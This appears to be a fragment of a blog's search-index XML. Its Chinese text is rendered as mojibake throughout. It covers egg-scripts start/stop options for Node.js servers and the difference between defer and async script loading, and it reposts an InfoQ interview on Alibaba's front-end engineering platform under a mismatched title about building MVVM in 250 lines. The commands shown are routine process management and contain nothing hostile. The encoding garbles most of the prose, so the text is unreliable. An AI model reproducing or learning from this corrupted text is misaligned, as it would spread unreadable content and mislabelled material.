1egg-scripts start --port=7001 --daemon --title=egg-server-showcase --port=7001 ç«¯å£å·ï¼Œé»˜è®¤ä¼šè¯»å–ç¯å¢ƒå˜é‡ process.env.PORTï¼Œå¦‚æœªä¼ é€’å°†ä½¿ç”¨æ¡†æ¶å†…ç½®ç«¯å£ 7001ã€‚ --daemon æ˜¯å¦å…è®¸åœ¨åå°æ¨¡å¼ï¼Œæ— éœ€ nohupã€‚è‹¥ä½¿ç”¨ Docker å»ºè®®ç›´æ¥å‰å°è¿è¡Œã€‚ --env=prod æ¡†æ¶è¿è¡Œç¯å¢ƒï¼Œé»˜è®¤ä¼šè¯»å–ç¯å¢ƒå˜é‡ process.env.EGG_SERVER_ENVï¼Œ å¦‚æœªä¼ é€’å°†ä½¿ç”¨æ¡†æ¶å†…ç½®ç¯å¢ƒ prodã€‚ --workers=2 æ¡†æ¶ worker çº¿ç¨‹æ•°ï¼Œé»˜è®¤ä¼šåˆ›å»ºå’Œ CPU æ ¸æ•°ç›¸å½“çš„ app worker æ•°ï¼Œå¯ä»¥å……åˆ†çš„åˆ©ç”¨ CPU èµ„æºã€‚ --title=egg-server-showcase ç”¨äºæ–¹ä¾¿ ps è¿›ç¨‹æ—¶ grep ç”¨ï¼Œé»˜è®¤ä¸º egg-server-${appname}ã€‚ --framework=yadan å¦‚æœåº”ç”¨ä½¿ç”¨äº†å¯ä»¥é…ç½® package.json çš„ egg.framework æˆ–æŒ‡å®šè¯¥å‚æ•°ã€‚ --ignore-stderr å¿½ç•¥å¯åŠ¨æœŸçš„æŠ¥é”™ã€‚ 9.1.1 å¯åŠ¨é…ç½®é¡¹ä½ ä¹Ÿå¯ä»¥åœ¨ config.{env}.js ä¸­é…ç½®æŒ‡å®šå¯åŠ¨é…ç½®ã€‚ 123456789// config/config.default.jsexports.cluster = &#123; listen: &#123; port: 7001, hostname: &apos;127.0.0.1&apos;, // path: &apos;/var/run/egg.sock&apos;, &#125;&#125; pathï¼Œportï¼Œhostname å‡ä¸º server.listen çš„å‚æ•°ï¼Œegg-scripts å’Œ egg.startCluster æ–¹æ³•ä¼ å…¥çš„ port ä¼˜å…ˆçº§é«˜äºæ­¤é…ç½®ã€‚s 9.1.2 åœæ­¢å‘½ä»¤è¯¥å‘½ä»¤å°†æ€æ­» master è¿›ç¨‹ï¼Œå¹¶é€šçŸ¥ worker å’Œ agent ä¼˜é›…é€€å‡ºã€‚æ”¯æŒä»¥ä¸‹å‚æ•°ï¼š --title=egg-server ç”¨äºæ€æ­»æŒ‡å®šçš„ egg åº”ç”¨ï¼Œæœªä¼ é€’åˆ™ä¼šç»ˆæ­¢æ‰€æœ‰çš„ Egg åº”ç”¨ã€‚ 12&quot;start&quot;: &quot;egg-scripts start --daemon --title=$&#123;è¿›ç¨‹åç§°&#125;&quot;,&quot;stop&quot;: &quot;egg-scripts stop --title=$&#123;è¿›ç¨‹åç§°&#125;&quot; ä½ ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡ 12ps -eo &quot;pid,command&quot; | grep -- &quot;--title=egg-server&quot;å¤åˆ¶ä»£ç  æ¥æ‰¾åˆ° master è¿›ç¨‹ï¼Œå¹¶ kill æ‰ï¼Œæ— éœ€ kill -9ã€‚]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[defer å’Œ async çš„åŒºåˆ«]]></title>
    <url>%2F2020%2F03%2F18%2FWeb%E5%89%8D%E7%AB%AF%2Fdefer%20%E5%92%8C%20async%20%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[å½“æµè§ˆå™¨ç¢°åˆ° script è„šæœ¬çš„æ—¶å€™ï¼š ç„¶åä»å®ç”¨è§’åº¦æ¥è¯´å‘¢ï¼Œé¦–å…ˆæŠŠæ‰€æœ‰è„šæœ¬éƒ½ä¸¢åˆ° body ä¹‹å‰æ˜¯æœ€ä½³å®è·µï¼Œå› ä¸ºå¯¹äºæ—§æµè§ˆå™¨æ¥è¯´è¿™æ˜¯å”¯ä¸€çš„ä¼˜åŒ–é€‰æ‹©ï¼Œæ­¤æ³•å¯ä¿è¯éè„šæœ¬çš„å…¶ä»–ä¸€åˆ‡å…ƒç´ èƒ½å¤Ÿä»¥æœ€å¿«çš„é€Ÿåº¦å¾—åˆ°åŠ è½½å’Œè§£æã€‚ æ¥ç€ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€å¼ å›¾å’¯ï¼š è“è‰²çº¿ä»£è¡¨ç½‘ç»œè¯»å–ï¼Œçº¢è‰²çº¿ä»£è¡¨æ‰§è¡Œæ—¶é—´ï¼Œè¿™ä¿©éƒ½æ˜¯é’ˆå¯¹è„šæœ¬çš„ï¼›ç»¿è‰²çº¿ä»£è¡¨ HTML è§£æã€‚ æ­¤å›¾å‘Šè¯‰æˆ‘ä»¬ä»¥ä¸‹å‡ ä¸ªè¦ç‚¹ï¼š defer å’Œ async åœ¨ç½‘ç»œè¯»å–ï¼ˆä¸‹è½½ï¼‰è¿™å—å„¿æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯å¼‚æ­¥çš„ï¼ˆç›¸è¾ƒäº HTML è§£æï¼‰ å®ƒä¿©çš„å·®åˆ«åœ¨äºè„šæœ¬ä¸‹è½½å®Œä¹‹åä½•æ—¶æ‰§è¡Œï¼Œæ˜¾ç„¶ defer æ˜¯æœ€æ¥è¿‘æˆ‘ä»¬å¯¹äºåº”ç”¨è„šæœ¬åŠ è½½å’Œæ‰§è¡Œçš„è¦æ±‚çš„ å…³äº deferï¼Œæ­¤å›¾æœªå°½ä¹‹å¤„åœ¨äºå®ƒæ˜¯æŒ‰ç…§åŠ è½½é¡ºåºæ‰§è¡Œè„šæœ¬çš„ï¼Œè¿™ä¸€ç‚¹è¦å–„åŠ åˆ©ç”¨ async åˆ™æ˜¯ä¸€ä¸ªä¹±åºæ‰§è¡Œçš„ä¸»ï¼Œåæ­£å¯¹å®ƒæ¥è¯´è„šæœ¬çš„åŠ è½½å’Œæ‰§è¡Œæ˜¯ç´§ç´§æŒ¨ç€çš„ï¼Œæ‰€ä»¥ä¸ç®¡ä½ å£°æ˜çš„é¡ºåºå¦‚ä½•ï¼Œåªè¦å®ƒåŠ è½½å®Œäº†å°±ä¼šç«‹åˆ»æ‰§è¡Œ ä»”ç»†æƒ³æƒ³ï¼Œasync å¯¹äºåº”ç”¨è„šæœ¬çš„ç”¨å¤„ä¸å¤§ï¼Œå› ä¸ºå®ƒå®Œå…¨ä¸è€ƒè™‘ä¾èµ–ï¼ˆå“ªæ€•æ˜¯æœ€ä½çº§çš„é¡ºåºæ‰§è¡Œï¼‰ï¼Œä¸è¿‡å®ƒå¯¹äºé‚£äº›å¯ä»¥ä¸ä¾èµ–ä»»ä½•è„šæœ¬æˆ–ä¸è¢«ä»»ä½•è„šæœ¬ä¾èµ–çš„è„šæœ¬æ¥è¯´å´æ˜¯éå¸¸åˆé€‚çš„ï¼Œæœ€å…¸å‹çš„ä¾‹å­ï¼šGoogle Analytics]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[250è¡Œå®ç°ä¸€ä¸ªç®€å•çš„MVVM]]></title>
    <url>%2F2020%2F03%2F18%2FWeb%E5%89%8D%E7%AB%AF%2F%E4%BB%8E%E9%98%BF%E9%87%8C%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96%E4%B8%AD%E5%8F%B0%E5%AE%9E%E8%B7%B5%EF%BC%8C%E7%9C%8B%E4%B8%AD%E5%8F%B0%E5%BB%BA%E8%AE%BE%E7%9A%84%E8%88%8D%E4%B8%8E%E5%BE%97%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ª InfoQï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://www.infoq.cn/article/6tLtcBjW1YpzZ9Z4dXRZ éšç€å‰ç«¯æŠ€æœ¯ä¸æ–­ä» Web å»¶ä¼¸è‡³å„ç§â€œç«¯â€ï¼Œå¤§å‰ç«¯çš„æ¦‚å¿µæ—©å·²æˆä¸ºä¸šå†…å…±è¯†ã€‚ä¼´éšç€å¤§å‰ç«¯çš„å‘å±•ï¼Œä¸ä¹‹ç›¸å¯¹åº”çš„å‰ç«¯å·¥ç¨‹ä½“ç³»ä¹Ÿåœ¨ä¸æ–­æ‹“å±•è¾¹ç•Œï¼Œä»…ä»…åªæ˜¯æ„å»ºã€å·¥å…·å’Œè§„èŒƒç­‰å¸¸è§„æ–¹å¼å·²ç»ä¸è¶³ä»¥è¡¨è¾¾å½“ä¸‹å‰ç«¯å·¥ç¨‹æ‰€æ¶‰åŠçš„é¢†åŸŸã€‚ è¿‘æ—¥ï¼ŒInfoQ è®°è€…æœ‰å¹¸é‡‡è®¿äº†é˜¿é‡Œå·´å·´é«˜çº§å‰ç«¯æŠ€æœ¯ä¸“å®¶æœ±åå†›ï¼ˆé˜¿å¤§ï¼‰ï¼Œä»–ä¸æˆ‘ä»¬åˆ†äº«äº†é˜¿é‡Œé›†å›¢å‰ç«¯å·¥ç¨‹åŒ–ä¸­å°çš„å®è·µè¿‡ç¨‹ï¼Œä»¥åŠå®è·µèƒŒåçš„ç»éªŒä¸æ€è€ƒã€‚ä»–åœ¨é‡‡è®¿ä¸­å¼ºè°ƒï¼Œå‰ç«¯å·¥ç¨‹åŒ–ä¸€å®šæ˜¯å¤§è¶‹åŠ¿ï¼Œä½†ä¸å»ºè®®å¤§å®¶ç›²ç›®åœ°è¿½æ±‚å·¥ç¨‹åŒ–ï¼Œå¯¹äºå¤§éƒ¨åˆ†è§„æ¨¡ä¸å¤§çš„å‰ç«¯å›¢é˜Ÿè€Œè¨€ï¼Œå·¥ç¨‹ä½“ç³»çš„å»ºè®¾å’Œè§„èŒƒå¹¶ä¸æ˜¯å½“åŠ¡ä¹‹æ€¥ã€‚æ¥ä¸‹æ¥ï¼Œä»–å°†åœ¨ QCon å…¨çƒè½¯ä»¶å¼€å‘å¤§ä¼šï¼ˆåŒ—äº¬ç«™ï¼‰2020 æ‹…ä»»å¤§å‰ç«¯å¤§å·¥ç¨‹ä¸“é¢˜å‡ºå“äººï¼Œä¸ºå¤§å®¶å¸¦æ¥å„å¤§å‚å‰ç«¯å›¢é˜Ÿåœ¨å·¥ç¨‹é¢†åŸŸä¸æ–­æ‹“å±•æ€è·¯ã€æ¢é“åˆ›æ–°ä¸­æ²‰æ·€ä¸‹æ¥çš„ç»éªŒå’Œå®è·µï¼Œæ„Ÿå…´è¶£çš„è¯»è€…å¯ä»¥å…³æ³¨ã€‚ä»¥ä¸‹ä¸ºé‡‡è®¿é—®ç­”å®å½•ã€‚ InfoQï¼šæ‚¨ä» 2013 å¹´å¼€å§‹ä¸“æ³¨äºå‰ç«¯å·¥ç¨‹åŒ–é¢†åŸŸï¼Œå¹¶å®Œæˆäº†æ·˜å®è¿‘ç™¾äººå‰ç«¯å›¢é˜Ÿç ”å‘æ¨¡å¼çš„æ•´ä½“å‡çº§ï¼Œèƒ½å¦å…ˆæ€»ä½“ä»‹ç»ä¸€ä¸‹æ·˜å®å‰ç«¯å›¢é˜Ÿç ”å‘æ¨¡å¼çš„å‘å±•å†ç¨‹ï¼ŒæœŸé—´ä¸€äº›é‡è¦çš„èŠ‚ç‚¹ã€‚ æœ±åå†›ï¼ˆé˜¿å¤§ï¼‰ï¼š æˆ‘æ˜¯ 09 å¹´åŠ å…¥çš„æ·˜å®ï¼Œé‚£æ—¶æ·˜å®å‰ç«¯çš„ç ”å‘ä½“ç³»è¿˜æ¯”è¾ƒåŸå§‹ï¼Œä»£ç ç®¡ç†æ˜¯åŸºäº SVN çš„ï¼Œæ‰€æœ‰å‰ç«¯ä»£ç éƒ½åœ¨ä¸€ä¸ªä»£ç ä»“åº“é‡Œã€‚æ¯å‘¨æœ‰ä¸¤ä¸ªå‘å¸ƒçª—å£æœŸï¼ŒSCM ä¼šæå‰æ‹‰å¥½å¼€å‘åˆ†æ”¯ï¼Œå¤§å®¶åœ¨ä¸€ä¸ªåˆ†æ”¯ä¸Šå¼€å‘ã€é›†æˆå’Œä¸Šçº¿ã€‚é‚£ä¸ªæ—¶å€™å‰ç«¯çš„ä»£ç æ˜¯æ‰€å†™å³æ‰€å¾—ï¼Œä¸éœ€è¦ç¼–è¯‘æ„å»ºä»€ä¹ˆçš„ï¼Œæœ¬åœ°çš„å¼€å‘ç¯å¢ƒç›¸å¯¹ä¹Ÿç®€å•ï¼ŒåŸºæœ¬ä»¥æ–‡æœ¬ç¼–è¾‘å™¨ä¸ºä¸»ã€‚å¤§æ¦‚åˆ°äº† 13 å¹´çš„å·¦å³ï¼ŒNodeJS å’Œ Git å¼€å§‹æµè¡Œï¼Œæ·˜å®å‰ç«¯è”åˆ SCM å›¢é˜ŸåŸºäºå¼€æºçš„ Gitlab åœ¨é›†å›¢å†…æ­å»ºäº† Git æ‰˜ç®¡ç¯å¢ƒï¼Œå‰ç«¯æ˜¯æœ€æ—©å°†ä»£ç ä» SVN å…¨éƒ¨è¿ç§»åˆ° Git è¿›è¡Œç®¡ç†çš„æŠ€æœ¯å²—ä½ï¼Œè¿™ä¸ªå†³ç­–å¯¹åç»­é˜¿é‡Œå·´å·´å‰ç«¯å·¥ç¨‹ä½“ç³»å»ºè®¾èµ·åˆ°äº†éå¸¸é‡è¦çš„å½±å“ã€‚ç”±äº Git åœ¨åˆ†æ”¯ç®¡ç†ç‰¹æ€§ä¸Šçš„ä¼˜åŠ¿ï¼ŒåŸå…ˆå‰ç«¯çš„é›†æˆå¼€å‘æ¨¡å¼æ…¢æ…¢æ¼”å˜æˆäº†åŸºäº Git åˆ†æ”¯å’Œ Gitlab Web Hook çš„åŠè‡ªåŠ¨åŒ–æ¨¡å¼ã€‚å¦å¤– NodeJS çš„å´›èµ·ä¹Ÿå¿«é€Ÿä¿ƒè¿›äº†æˆ‘ä»¬å†…éƒ¨å‰ç«¯æœ¬åœ°å¼€å‘å·¥å…·ç”Ÿæ€çš„å®Œå–„ï¼Œå„ç§æœ¬åœ° Command Line å·¥å…·å¦‚é›¨åæ˜¥ç¬‹èˆ¬æ¶Œç°ã€‚ç™¾èŠ±é½æ”¾çš„ç¹è£ä¹‹åå¿…ç„¶çš„ç»“æœå°±æ˜¯è§„èŒƒå’Œä¸€ç»Ÿï¼Œå½¼æ—¶åˆšå¥½é›†å›¢åœ¨æ¨è¡Œä¸­å°æˆ˜ç•¥ï¼Œå‰ç«¯ç ”å‘å·¥ç¨‹ä½“ç³»é¡ºåŠ¿èµ°ä¸Šä¸­å°åŒ–é“è·¯ã€‚ InfoQï¼šé›†å›¢å†…éƒ¨æ˜¯ä»€ä¹ˆæ—¶å€™ç¡®å®šè¦åšå‰ç«¯å·¥ç¨‹åŒ–ä¸­å°çš„ï¼Ÿåšè¿™ä¸ªå†³å®šçš„èƒŒæ™¯æ˜¯ä»€ä¹ˆæ ·çš„ï¼Ÿé¢ä¸´çš„æœ€å¤§æŒ‘æˆ˜æ˜¯ä»€ä¹ˆï¼ŸæœŸæœ›ä¸­å°è§£å†³ä»€ä¹ˆé—®é¢˜ï¼Ÿ æœ±åå†›ï¼ˆé˜¿å¤§ï¼‰ï¼š 17 å¹´åˆçš„æ—¶å€™å§ï¼Œåœ¨è¿™ä¹‹å‰æˆ‘ä»¬å·²ç»ç»Ÿä¸€äº†æ·˜å®å‰ç«¯å›¢é˜Ÿçš„å·¥ç¨‹ä½“ç³»ï¼Œæœ‰äº†å®Œå–„çš„æœ¬åœ°å¼€å‘å·¥å…·ç”Ÿæ€ï¼Œæ ‡å‡†åŒ–äº†æœ¬åœ°çš„å¼€å‘å’Œè°ƒè¯•ã€‚å¦å¤–è¿˜æ­å»ºäº†ä¸€å¥—åœ¨çº¿å‘å¸ƒæµç¨‹ï¼Œå­µåŒ–äº†å¦‚äº‘æ„å»ºï¼ˆä»£ç åœ¨çº¿æ„å»ºï¼‰ã€é—¨ç¥ï¼ˆä»£ç é™æ€æ‰«æï¼‰ç­‰å‰ç«¯å·¥ç¨‹åŸºç¡€è®¾æ–½ã€‚é‚£ä¸€å¹´åˆå›¢é˜Ÿåœ¨åšè§„åˆ’çš„æ—¶å€™ï¼Œå¤§å®¶å¯¹å‰ç«¯å·¥ç¨‹ä½“ç³»æ¥ä¸‹æ¥å‘å±•æ–¹å‘æœ‰ä¸€äº›äº‰è®®ï¼šç¬¬ä¸€ä¸ªè§‚ç‚¹è®¤ä¸ºæˆ‘ä»¬åº”è¯¥å°†æœ¬åœ°çš„ç ”å‘å·¥å…·ç»Ÿç»Ÿæ¬ä¸Šäº‘ï¼ŒåŒ…æ‹¬åœ¨çº¿ IDEã€åœ¨çº¿ Dev ç­‰ï¼Œåœ¨çº¿åŒ–ä¸€å®šæ˜¯æœªæ¥çš„è¶‹åŠ¿ï¼›ç¬¬äºŒä¸ªè§‚ç‚¹è®¤ä¸ºæˆ‘ä»¬åº”è¯¥è¾“å‡ºæ·˜å®å‰ç«¯çš„å·¥ç¨‹èƒ½åŠ›åˆ°æ•´ä¸ªé˜¿é‡Œå·´å·´é›†å›¢ï¼Œæ·˜å®å‰ç«¯çš„å·¥ç¨‹ä½“ç³»å»ºè®¾å·²ç»ç«™åœ¨äº†é›†å›¢çš„åˆ¶é«˜ç‚¹ï¼Œåº”è¯¥é¡ºåŠ¿æ¨è¿›æ•´ä¸ªé›†å›¢å‰ç«¯ç ”å‘ä½“ç³»çš„è§„èŒƒåŒ–ã€‚åœ¨å½“æ—¶çš„æƒ…å†µä¸‹ï¼Œé›†å›¢ä¸­å¤§éƒ¨åˆ† BU çš„å‰ç«¯ä½“ç³»æˆ–å¤šæˆ–å°‘éƒ½æºè‡ªæ·˜å®å‰ç«¯ï¼Œä¸­é—´æœ‰ç€åƒä¸ä¸‡ç¼•çš„å…³ç³»ï¼Œå¦å¤–è¿˜æœ‰ä¸€ä¸ªå¤–éƒ¨å› ç´ å°±æ˜¯å¤§å®¶å·²ç»éå¸¸ç†Ÿæ‚‰çš„é˜¿é‡Œæå‡ºçš„ä¸­å°æˆ˜ç•¥ï¼Œåœ¨é›†å›¢ä¸­å°æˆ˜ç•¥å¤§çš„è¶‹åŠ¿ä¸‹æˆ‘ä»¬æœ€ç»ˆæ¯…ç„¶å†³ç„¶åœ°é€‰æ‹©äº†å»ºè®¾é˜¿é‡Œå·´å·´å‰ç«¯å·¥ç¨‹ä¸­å°ã€‚å½“ç„¶è¿™ä¸æ˜¯è¯´ç¬¬ä¸€ä»¶äº‹æƒ…å°±ä¸é‡è¦ï¼Œæ°å·§åœ¨ç»å†è¿‡å‰ç«¯å·¥ç¨‹ä¸­å°çš„å»ºè®¾åï¼Œæˆ‘ä»¬ç›®å‰åœ¨åšçš„å°±æ˜¯ IDE å’Œåœ¨çº¿ç ”å‘èƒ½åŠ›ã€‚ é˜¿é‡Œæ˜¯ä¸€ä¸ªåºå¤§çš„ç»æµä½“ï¼Œå„äº‹ä¸šç¾¤å’Œäº‹ä¸šéƒ¨åŠ èµ·æ¥æœ‰å‡ åä¸Šç™¾ä¸ªå¤§å¤§å°å°çš„å‰ç«¯å›¢é˜Ÿï¼Œæ¨è¿›å¦‚æ­¤å¤šçš„å›¢é˜Ÿæ¥è§„èŒƒå‰ç«¯ç ”å‘ä½“ç³»çš„é˜»åŠ›æ˜¯å·¨å¤§çš„ã€‚åŠ ä¹‹æ¯ä¸ªå‰ç«¯å›¢é˜Ÿå½“ä¸‹çš„å‰ç«¯å·¥ç¨‹ä½“ç³»å»ºè®¾ç¨‹åº¦ä¸ä¸€æ ·ï¼Œå¯¹æ ‡å‡†åŒ–å‰ç«¯å·¥ç¨‹å¼€å‘çš„ç†è§£å’Œéœ€æ±‚ä¹Ÿéƒ½ä¸ä¸€æ ·ï¼Œå¦‚ä½•è¯´æœå¹¶åè°ƒæ¨è¿›å¦‚æ­¤ä¼—å¤šçš„å‰ç«¯å›¢é˜Ÿï¼Œæ˜¯æˆ‘ä»¬åšè¿™ä»¶äº‹æƒ…é‡åˆ°çš„ç¬¬ä¸€ä¸ªéš¾é¢˜ã€‚\ç®€å•è¯´ä¸‹æˆ‘ä»¬æ˜¯å¦‚ä½•è§£å†³çš„ï¼Œç±»ä¼¼çš„é—®é¢˜æˆ‘æƒ³ç¨å¾®æœ‰è§„æ¨¡ä¸€ç‚¹çš„è·¨å›¢é˜Ÿåä½œé¡¹ç›®åº”è¯¥éƒ½ä¼šç¢°åˆ°ï¼Œæˆ‘ä»¬é¦–å…ˆ*éœ€è¦å¾—åˆ°è‡ªä¸Šè€Œä¸‹çš„æ”¯æŒ*ã€‚é˜¿é‡Œå·´å·´é›†å›¢å†…ä¸åŒçš„æŠ€æœ¯æ ˆéƒ½æœ‰ä¸€ä¸ªæŠ€æœ¯å§”å‘˜ä¼šï¼Œå‰ç«¯ä¹Ÿæœ‰ä¸€ä¸ªé˜¿é‡Œå‰ç«¯æŠ€æœ¯å§”å‘˜ä¼šã€‚æŠ€æœ¯å§”å‘˜ä¼šçš„æˆå‘˜ä¸€èˆ¬éƒ½æ˜¯å„äº‹ä¸šç¾¤è¾ƒå¤§è§„æ¨¡å‰ç«¯å›¢é˜Ÿçš„ Leaderï¼Œæ¯å¹´å§”å‘˜ä¼šä¼šå‘èµ·å‡ ä¸ªæŠ€æœ¯é¡¹ç›®ï¼Œå¹¶ååŒé›†å›¢å†…èµ„æºåˆåŠ›æ¨è¿›ã€‚ç»è¿‡åŠªåŠ›ï¼Œå‰ç«¯å·¥ç¨‹ä¸­å°äº‰å–åˆ°äº†å§”å‘˜ä¼šå…¶ä¸­ä¸€ä¸ªæŠ€æœ¯é¡¹ç›®ã€‚æœ‰äº†è‡ªä¸Šè€Œä¸‹çš„æ”¯æŒï¼Œå¾ˆå¤šäº‹æƒ…æ¨è¿›å°±æ–¹ä¾¿å¤šäº†ã€‚ä¸è¿‡å…‰é è‡ªä¸Šè€Œä¸‹æ¨åŠ¨ä¹Ÿæ˜¯ä¸è¡Œçš„ï¼Œæ¯•ç«ŸæŠ€æœ¯ä½“ç³»çš„å‡çº§æ”¹é€ å¯¹æ—¥å¸¸ä¸šåŠ¡çš„æ­£å¸¸è¿›åº¦è‚¯å®šæ˜¯æœ‰å½±å“çš„ã€‚å¦å¤–å¯¹äºå¤§éƒ¨åˆ†è§„æ¨¡ä¸å¤§çš„å‰ç«¯å›¢é˜Ÿè€Œè¨€ï¼Œå·¥ç¨‹ä½“ç³»çš„å»ºè®¾å’Œè§„èŒƒå¹¶ä¸æ˜¯å½“åŠ¡ä¹‹æ€¥ã€‚æ‰€ä»¥æˆ‘ä»¬é¦–å…ˆé€‰æ‹©é›†å›¢å†…è§„æ¨¡æœ€å¤§çš„ TOP 5 å‰ç«¯å›¢é˜Ÿè¿›è¡Œæ¨è¿›ï¼Œè¿™äº›å›¢é˜Ÿå¯¹äºè§„èŒƒå‰ç«¯ç ”å‘çš„éœ€æ±‚æ›´åŠ å¼ºçƒˆï¼Œå¹¶ä¸”æœ¬èº«ä¹Ÿæœ‰ä¸€å®šçš„å·¥ç¨‹åº•å­ç§¯ç´¯ï¼Œæ²Ÿé€šå¯ä»¥æ›´åŠ é¡ºç•…ï¼Œå½¼æ­¤ä¹‹é—´ä¹Ÿæœ‰æ›´å¤šçš„ç†è§£å’Œè®¤å¯ã€‚å½“å‡ ä¸ªè¾ƒå¤§å‰ç«¯å›¢é˜Ÿç»Ÿä¸€ä¹‹åï¼Œå…¶å®ƒå›¢é˜Ÿå°±è½»æ¾å¾ˆå¤šäº†ï¼Œç”šè‡³å¤§éƒ¨åˆ†å°å›¢é˜Ÿæ˜¯ä¸»åŠ¨è¦æ±‚æ¥å…¥å‰ç«¯å·¥ç¨‹ä¸­å°çš„ã€‚ å¤§éƒ¨åˆ†çš„åŸºç¡€æŠ€æœ¯ä½“ç³»å»ºè®¾é€ƒä¸å¼€ä¸‰ä¸ªå…³é”®å­—ï¼šæ•ˆç‡ã€è´¨é‡å’Œæˆæœ¬ã€‚å‰ç«¯å·¥ç¨‹ä½“ç³»çš„å»ºè®¾ä¹Ÿæ˜¯ç´§ç´§å›´ç»•ç€è¿™ä¸‰ä¸ªå…³é”®å­—ï¼Œé€šè¿‡æ ‡å‡†åŒ–çš„ç ”å‘èƒ½åŠ›å’Œç»Ÿä¸€çš„æµç¨‹è§„èŒƒæ¥çº¦æŸç ”å‘è¿‡ç¨‹ä¸­çš„ä¸ç¡®å®šæ€§ï¼Œä»è€Œæå‡ç ”å‘æ•ˆç‡å’Œè´¨é‡ã€‚æ•ˆç‡å’Œè´¨é‡æå‡äº†ï¼Œæˆæœ¬è‡ªç„¶å°±é™äº†ã€‚è€Œå‰ç«¯å·¥ç¨‹ä¸­å°çš„ç›®çš„æ˜¯æœŸæœ›é™ä½æ‰€æœ‰å‰ç«¯å›¢é˜Ÿè¾¾æˆè¿™ä¸€ç›®æ ‡çš„é—¨æ§›ï¼Œä¸ç®¡å›¢é˜Ÿåœ¨ä»€ä¹ˆé˜¶æ®µã€æ˜¯ä½•ç§è§„æ¨¡ï¼Œéƒ½èƒ½å€ŸåŠ©å‰ç«¯å·¥ç¨‹ä¸­å°å¿«é€Ÿè½åœ°é€‚åˆè‡ªèº«ç»„ç»‡å½¢æ€å’ŒæŠ€æœ¯ç‰¹ç‚¹çš„å‰ç«¯å·¥ç¨‹æ–¹æ¡ˆã€‚ InfoQï¼šé˜¿é‡Œå‰ç«¯å·¥ç¨‹åŒ–ä¸­å°èƒ½å¤Ÿæä¾›å“ªäº›æœåŠ¡å’ŒæŠ€æœ¯èƒ½åŠ›ï¼Ÿåœ¨é€šè¿‡ä¸­å°æé«˜å‰ç«¯ç ”å‘æ•ˆç‡ä¸Šï¼Œèƒ½å¦åˆ—ä¸¾ä¸€ä¸ªå…·ä½“ç¤ºä¾‹è¿›è¡Œè¯´æ˜ï¼Ÿ æœ±åå†›ï¼ˆé˜¿å¤§ï¼‰ï¼š åœ¨æˆ‘ä¸ªäººçš„ç†è§£é‡Œï¼Œæ ‡å‡†åŒ–å’Œå¼€æ”¾ä¸€å®šæ˜¯ä»»ä½•ä¸€ä¸ªä¸­å°å¿…é¡»å…·å¤‡çš„èƒ½åŠ›ã€‚è¿™ä¸¤è€…çœ‹ä¸Šå»ä¼¼ä¹æœ‰ç‚¹çŸ›ç›¾ï¼Œå´æ˜¯æˆ‘ä»¬åœ¨å»ºè®¾å‰ç«¯å·¥ç¨‹ä¸­å°æ—¶åˆ‡å®çš„æ„Ÿå—å’Œæ€»ç»“ã€‚æ¯”å¦‚æˆ‘ä»¬ç»Ÿä¸€äº†é™æ€æºç«™å’Œå‘å¸ƒæµç¨‹ï¼Œè§„èŒƒäº†æœ¬åœ°å·¥å…·å‘½ä»¤å…¥å£å’Œè£…è½½æ›´æ–°æ¨¡å¼ï¼Œæ›´æ˜¯æ¨è¿›äº†æ ‡å‡†åŒ–çš„åœ¨çº¿æ„å»ºä½“ç³»ä¸ä»£ç æ£€æŸ¥ä½“ç³»çš„å»ºè®¾ã€‚å…³äºå¼€æ”¾ï¼Œå‰é¢æœ‰è®²åˆ°å‰ç«¯å·¥ç¨‹ä¸­å°çš„ç›®çš„æ˜¯é™ä½æ‰€æœ‰å‰ç«¯å›¢é˜Ÿå·¥ç¨‹ä½“ç³»å»ºè®¾çš„é—¨æ§›ï¼Œæ‰€ä»¥èµ‹èƒ½å¿…ç„¶æ˜¯ä¸­å°çš„ä½¿å‘½ä¹‹ä¸€ï¼Œå¼€æ”¾æ˜¯èµ‹èƒ½æœ€ç›´æ¥æœ‰æ•ˆçš„æ–¹å¼ã€‚ å®Œå–„çš„å·¥ç¨‹ä½“ç³»å¿…ç„¶ä¼šå¸®åŠ©å›¢é˜Ÿæå‡ç ”å‘æ•ˆç‡ï¼Œè€Œå·¥ç¨‹ä¸­å°çš„ä½¿å‘½æ˜¯å¸®åŠ©æ¯ä¸ªå›¢é˜Ÿæ›´é«˜æ•ˆçš„å®Œå–„å·¥ç¨‹ä½“ç³»çš„å»ºè®¾ã€‚å¯¹äºä¸­å°è€Œè¨€ï¼Œç ”å‘æ•ˆç‡çš„æå‡å…¶å®å¹¶ä¸æ˜¯æœ€ç›´æ¥çš„æ”¶ç›Šï¼Œè€Œæ˜¯å…¨å±€æ€§çš„æ”¶æ•›å’Œç®¡æ§èƒ½åŠ›ã€‚æˆ‘ä¸¾ä¸ªæ”¶æ•›ç®¡æ§æ–¹é¢çš„ä¾‹å­ï¼š18 å¹´é›†å›¢æ•´ä½“æ¨è¿›å®‰å…¨ç”Ÿäº§ç­–ç•¥ï¼Œæ‰€æœ‰çš„çº¿ä¸Šå˜æ›´å¿…é¡»æ¥å…¥ç»Ÿä¸€çš„å˜æ›´ç®¡æ§å¹³å°ï¼Œæäº¤å˜æ›´å•åå…è®¸è¿›è¡Œçº¿ä¸Šå˜æ›´ã€‚è¿™ä¸ªæ—¶å€™å·¥ç¨‹ä¸­å°çš„ä»·å€¼å°±ä½“ç°å‡ºæ¥äº†ï¼Œå› ä¸ºæˆ‘ä»¬å·²ç»ç»è¿‡ä¸€å¹´å¤šçš„åŠªåŠ›æ”¶æ•›äº†æ‰€æœ‰å‰ç«¯çš„å‘å¸ƒæµç¨‹ï¼Œæ•´ä¸ªé›†å›¢æ‰€æœ‰å‰ç«¯çš„å‘å¸ƒæ¥å…¥ç»Ÿä¸€å˜æ›´ç®¡æ§å‡ 